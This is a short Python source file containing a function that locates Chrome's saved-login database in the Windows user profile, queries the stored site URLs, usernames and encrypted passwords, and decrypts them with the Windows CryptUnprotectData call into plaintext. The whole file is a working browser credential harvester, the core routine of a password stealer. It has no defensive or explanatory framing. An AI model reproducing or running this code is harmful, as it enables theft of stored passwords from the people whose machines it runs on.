"""
author: Tomer Perets
date: 5.5.18
"""

import os
import win32crypt
import usefull_things as ut

def get_chrome_saved_password():
    """
    decrypt the encrypted password in the chrome database
    :return: list of the passwords
    :return2: error number
    """
    data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    if not ut.file_exists(data_path):
        return ['err', 0, data_path]
    cursor = ut.connect_to_sqlite3_db(data_path)
    select_statement1 = 'SELECT action_url, username_value, password_value FROM logins'
    data = ut.execute_sql(cursor, select_statement1)
    if len(data) > 0:
        list_of_passwords = []
        password = ""
        for result in data:
            try:
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            except Exception:
                continue
            if password:
                list_of_passwords.append((result[0], result[1], password))
        return list_of_passwords
    else:
        return ['err', 1, select_statement1]